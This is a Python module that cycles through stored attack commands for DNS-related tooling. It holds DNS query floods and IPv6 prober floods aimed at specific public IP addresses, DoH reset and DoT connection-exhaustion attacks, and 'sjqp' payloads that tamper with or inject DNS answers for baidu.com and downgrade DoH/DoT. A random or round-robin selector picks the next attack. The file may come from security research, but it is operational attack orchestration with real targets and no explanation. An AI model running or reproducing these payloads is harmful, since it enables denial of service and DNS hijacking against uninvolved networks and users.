import random


ddos_policy_dic = [
    # dnssec ./dtool 
    {"id": "3", "payload": "query 47.76.239.205 -p 53 -R -d tree.ncache.site -r 50 -n 5000"},
    {"id": "3", "payload": "query 47.76.239.205 -p 53 -R -d tree.ncache.site -r 200 -n 20000"},
    {"id": "3", "payload": "query 47.76.239.205 -p 53 -R -d tree.ncache.site -r 300 -n 30000"},
    {"id": "3", "payload": "query 47.76.239.205 -p 53 -R -d alias.ncache.site -r 50 -n 5000"},
    {"id": "3", "payload": "query 47.76.239.205 -p 53 -R -d alias.ncache.site -r 200 -n 20000"},
    {"id": "3", "payload": "query 47.76.239.205 -p 53 -R -d alias.ncache.site -r 300 -n 30000"},
    
    # ipv6 ./prober 
    {"id": "5", "payload": "comm.e64.fun 5000 47.76.237.22"},
    {"id": "5", "payload": "comm.e64.fun 10000 47.76.237.22 47.242.54.229"},
    {"id": "5", "payload": "comm.e64.fun 15000 47.76.237.22 47.242.54.229 8.210.135.224"},
    
    # doh python start_reset_att.py
    {"id": "7", "payload": "-n 1"},
    {"id": "7", "payload": "-n 3"},
    {"id": "7", "payload": "-n 4"},
    
    # dot python3 start_pending.py 
    {"id": "10", "payload": "-n 8 -wait 50 -round 1"},
    {"id": "10", "payload": "-n 8 -wait 100 -round 5"},
    {"id": "10", "payload": "-n 8 -wait 300 -round 5"},
]
sjqp_policy_dic = [
    # sjqp dnssec python proxy.py
    {"id": "4", "payload": ""},
    
    # sjqp ipv6 ./attack.sh 
    {"id": "6", "payload": "240b:4001:150:a600:5b9:609e:d0ae:e1a 2000::1 eth0 baidu.com 240b:4001:150:a600:5b9:609e:d0ae:e1b"},
    {"id": "6", "payload": "240b:4001:150:a600:5b9:609e:d0ae:e1a 2000::1 eth0 baidu.com 240b:4001:150:a600:5b9:609e:d0ae:e1b"},
    
    # sjqp doh python downgrade_phase1.py python downgrade_phase1.py 
    {"id": "8", "payload": "-tamper baidu.com -a 1.1.1.1 && python degrade_phase2.py -p doh"},
    {"id": "9", "payload": "-inject baidu.com -a 1.1.1.1 && python degrade_phase2.py -p doh"},
    
    # sjqp dot python downgrade_phase1.py python downgrade_phase1.py
    {"id": "11", "payload": "-tamper baidu.com -a 1.1.1.1 && python degrade_phase2.py -p dot"},
    {"id": "12", "payload": "-inject baidu.com -a 1.1.1.1 && python degrade_phase2.py -p dot"},
]
# 存储当前索引
# 存储当前索引
ddos_current_index = 0
sjqp_current_index = 0

def get_policy(policy_type):
    global ddos_current_index, sjqp_current_index
    
    if policy_type == "ddos":
        command = ddos_policy_dic[ddos_current_index]
        ddos_current_index = (ddos_current_index + 1) % len(ddos_policy_dic)
    elif policy_type == "sjqp":
        command = sjqp_policy_dic[sjqp_current_index]
        sjqp_current_index = (sjqp_current_index + 1) % len(sjqp_policy_dic)
    elif policy_type == "auto":
        if random.choice([True, False]):
            command = ddos_policy_dic[ddos_current_index]
            ddos_current_index = (ddos_current_index + 1) % len(ddos_policy_dic)
        else:
            command = sjqp_policy_dic[sjqp_current_index]
            sjqp_current_index = (sjqp_current_index + 1) % len(sjqp_policy_dic)
    return command

if __name__ == '__main__':
    print(get_policy("sjqp"))
    print(get_policy("sjqp"))
    print(get_policy("ddos"))
    print(get_policy("ddos"))
    print(get_policy("ddos"))
    print(get_policy("ddos"))
    print(get_policy("ddos"))
    print(get_policy("sjqp"))
    print(get_policy("sjqp"))
   